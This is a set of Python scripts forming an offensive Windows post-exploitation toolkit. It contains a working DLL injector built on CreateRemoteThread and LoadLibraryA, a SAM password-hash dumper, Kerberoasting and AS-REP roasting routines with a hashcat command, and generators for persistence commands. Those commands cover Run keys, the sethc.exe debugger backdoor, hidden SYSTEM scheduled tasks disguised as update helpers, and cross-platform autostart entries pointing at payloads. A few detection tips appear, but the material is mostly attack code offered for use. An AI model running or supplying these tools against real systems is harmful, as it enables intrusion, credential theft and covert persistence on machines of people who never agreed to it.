dll_injector:
import ctypes
import ctypes.wintypes
import struct
import sys
import os

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04

def inject_dll(pid, dll_path):
    print(f'Target PID: {pid}')
    print(f'DLL Path: {dll_path}')
    if sys.platform != 'win32':
        print('  [DEMO MODE - Windows APIs not available]')
        print(f'  1. OpenProcess({pid}, PROCESS_ALL_ACCESS)')
        print(f'  2. VirtualAllocEx({len(dll_path)} bytes)')
        print(f'  3. WriteProcessMemory("{dll_path}")')
        print(f'  4. GetProcAddress(kernel32, "LoadLibraryA")')
        print(f'  5. CreateRemoteThread(LoadLibraryA, dll_path_addr)')
        return True
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print(f'  Failed to open process: {ctypes.get_last_error()}')
        return False
    dll_path_bytes = dll_path.encode() + b'\x00'
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes, len(dll_path_bytes), None)
    h_kernel32 = kernel32.GetModuleHandleW('kernel32.dll')
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')
    thread_id = ctypes.wintypes.DWORD(0)
    kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id))
    print(f'  Injected! Thread ID: {thread_id.value}')
    kernel32.CloseHandle(h_process)
    return True

print('DLL Injection Tool')
print('='*60)
inject_dll(1234, 'C:\\payload.dll')

print('\nInjection techniques:')
for tech in ['Classic DLL Injection (CreateRemoteThread)', 'Reflective DLL Injection', 'Process Hollowing', 'APC Injection', 'Thread Hijacking']:
    print(f'  - {tech}')
sam_dump:
import ctypes
import struct
import os
import sys
import hashlib

def dump_sam_hashes():
    print('SAM Database Hash Dumper')
    print('='*60)
    if sys.platform != 'win32':
        print('[DEMO MODE - Windows registry not available]')
        print('\nSimulated SAM dump output:')
        demo_hashes = [
            ('Administrator', '500', 'aad3b435b51404eeaad3b435b51404ee', '31d6cfe0d16ae931b73c59d7e0c089c0'),
            ('Guest', '501', 'aad3b435b51404eeaad3b435b51404ee', '31d6cfe0d16ae931b73c59d7e0c089c0'),
            ('DefaultAccount', '503', 'aad3b435b51404eeaad3b435b51404ee', '31d6cfe0d16ae931b73c59d7e0c089c0'),
            ('user1', '1001', 'aad3b435b51404eeaad3b435b51404ee', 'fc525c9683e8fe067095ba2ddc971889'),
        ]
        for user, rid, lm, nt in demo_hashes:
            print(f'  {user}:{rid}:{lm}:{nt}:::')
        return demo_hashes
    # Real Windows implementation
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SAM\SAM\Domains\Account\Users')
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                print(f'  Found user RID: {subkey_name}')
                i += 1
            except OSError:
                break
    except PermissionError:
        print('  ERROR: Requires SYSTEM or Administrator privileges')
        print('  Run as: psexec -s -i cmd.exe')
    return []

result = dump_sam_hashes()
print(f'\nDumped {len(result)} accounts')
print('\nCommon empty/default NTLM hashes:')
print('  31d6cfe0d16ae931b73c59d7e0c089c0 = empty password')
print('  aad3b435b51404eeaad3b435b51404ee = empty LM hash')
kerberos_attack:
import struct
import socket
import hashlib
import os
import time
import binascii

def build_as_req(username, domain, nonce=None):
    if nonce is None:
        nonce = struct.unpack('!I', os.urandom(4))[0]
    print(f'Building AS-REQ for {username}@{domain}')
    print(f'  Nonce: {nonce}')
    # Kerberos message structure (simplified)
    msg = {
        'pvno': 5,
        'msg-type': 10,  # AS-REQ
        'padata': [],
        'req-body': {
            'kdc-options': 0x40810010,
            'cname': {'name-type': 1, 'name-string': [username]},
            'realm': domain.upper(),
            'sname': {'name-type': 2, 'name-string': ['krbtgt', domain.upper()]},
            'nonce': nonce,
            'etype': [17, 18, 23],  # AES128, AES256, RC4
        }
    }
    return msg

def kerberoast_hash(spn, ticket_data):
    # Format for hashcat/john
    return f'$krb5tgs$23$*{spn}*${binascii.hexlify(ticket_data).decode()}'

def asreproast_hash(username, as_rep_data):
    return f'$krb5asrep$23${username}@DOMAIN${binascii.hexlify(as_rep_data).decode()}'

print('Kerberos Attack Toolkit')
print('='*60)

# AS-REP Roasting
print('\n--- AS-REP Roasting ---')
print('Finding users without pre-auth...')
vuln_users = ['svc_backup', 'svc_sql', 'legacy_admin']
for user in vuln_users:
    as_req = build_as_req(user, 'CORP.LOCAL')
    fake_hash = asreproast_hash(user, os.urandom(32))
    print(f'  {user}: {fake_hash[:60]}...')

# Kerberoasting
print('\n--- Kerberoasting ---')
spns = ['MSSQLSvc/db01.corp.local:1433', 'HTTP/web01.corp.local', 'CIFS/fs01.corp.local']
for spn in spns:
    fake_hash = kerberoast_hash(spn, os.urandom(32))
    print(f'  {spn}')
    print(f'    Hash: {fake_hash[:60]}...')

print('\nCrack with: hashcat -m 13100 hashes.txt wordlist.txt')
windows_registry:
import ctypes
import sys
import os

def registry_persistence_locations():
    locations = [
        (r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', 'User startup'),
        (r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run', 'System startup (admin)'),
        (r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'Run once (user)'),
        (r'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'Run once (admin)'),
        (r'HKLM\SYSTEM\CurrentControlSet\Services', 'Windows services'),
        (r'HKCU\Environment', 'User environment variables'),
        (r'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options', 'IFEO debugger'),
        (r'HKCU\Software\Classes\ms-settings\shell\open\command', 'UAC bypass fodhelper'),
    ]
    return locations

def generate_registry_commands(payload_path):
    commands = []
    commands.append(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "{payload_path}" /f')
    commands.append(f'reg add "HKCU\\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "{payload_path}" /f')
    commands.append(f'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v "Debugger" /t REG_SZ /d "{payload_path}" /f')
    return commands

print('Windows Registry Persistence')
print('='*60)

print('\nPersistence Locations:')
for path, desc in registry_persistence_locations():
    print(f'  [{desc}]')
    print(f'    {path}')

payload = 'C:\\Users\\Public\\update.exe'
print(f'\nGenerated commands for: {payload}')
for cmd in generate_registry_commands(payload):
    print(f'  > {cmd}')

print('\nDetection:')
print('  - Monitor registry key changes (Sysmon Event ID 13)')
print('  - Autoruns by Sysinternals')
print('  - Check Run keys on incident response')
scheduled_task_persist:
import subprocess
import os
import sys
import xml.etree.ElementTree as ET

def create_task_xml(task_name, command, trigger_time='07:00:00', user='SYSTEM'):
    xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Maintenance Task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2024-01-01T{trigger_time}</StartBoundary>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
      <Enabled>true</Enabled>
    </TimeTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{command}</Command>
    </Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
  </Settings>
  <Principals>
    <Principal>
      <UserId>{user}</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>'''
    return xml_template

def generate_schtasks_commands(task_name, payload):
    cmds = [
        f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc ONLOGON /ru SYSTEM /f',
        f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc MINUTE /mo 30 /f',
        f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc ONIDLE /i 5 /f',
    ]
    return cmds

print('Scheduled Task Persistence')
print('='*60)

task = 'WindowsUpdateHelper'
payload = 'C:\\Users\\Public\\update.exe'

print(f'Task Name: {task}')
print(f'Payload: {payload}')

print('\nCommand-line methods:')
for cmd in generate_schtasks_commands(task, payload):
    print(f'  > {cmd}')

print('\nXML Task Definition:')
print(create_task_xml(task, payload)[:500] + '...')

print('\nDetection:')
print('  - Sysmon Event ID 1 (schtasks.exe)')
print('  - Windows Event ID 4698 (task created)')
print('  - Check: schtasks /query /fo LIST /v')
startup_folder_persist:
import os
import shutil
import sys

def get_startup_paths():
    paths = {}
    if sys.platform == 'win32':
        paths['user'] = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
        paths['all_users'] = os.path.expandvars(r'%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    elif sys.platform == 'darwin':
        paths['user'] = os.path.expanduser('~/Library/LaunchAgents')
        paths['system'] = '/Library/LaunchDaemons'
    else:  # Linux
        paths['user'] = os.path.expanduser('~/.config/autostart')
        paths['system'] = '/etc/xdg/autostart'
    return paths

def create_shortcut_payload(target_exe, shortcut_name='WindowsUpdate'):
    # VBS script to create .lnk shortcut
    vbs = f'''Set WshShell = WScript.CreateObject("WScript.Shell")
Set shortcut = WshShell.CreateShortcut(WshShell.SpecialFolders("Startup") & "\\{shortcut_name}.lnk")
shortcut.TargetPath = "{target_exe}"
shortcut.WindowStyle = 7
shortcut.Description = "System Update"
shortcut.Save'''
    return vbs

def create_linux_autostart(name, command):
    desktop_entry = f'''[Desktop Entry]
Type=Application
Name={name}
Exec={command}
Hidden=true
X-GNOME-Autostart-enabled=true'''
    return desktop_entry

def create_macos_plist(label, command):
    plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>{label}</string>
    <key>ProgramArguments</key>
    <array><string>{command}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>'''
    return plist

print('Startup Folder Persistence (Cross-Platform)')
print('='*60)

print('\nStartup Paths:')
for kind, path in get_startup_paths().items():
    exists = os.path.exists(path)
    print(f'  [{kind}] {path} (exists: {exists})')

print('\nWindows (VBS shortcut):')
print(create_shortcut_payload('C:\\payload.exe'))

print('\nLinux (.desktop autostart):')
print(create_linux_autostart('System Update', '/tmp/payload'))

print('\nmacOS (LaunchAgent plist):')
print(create_macos_plist('com.system.update', '/tmp/payload'))
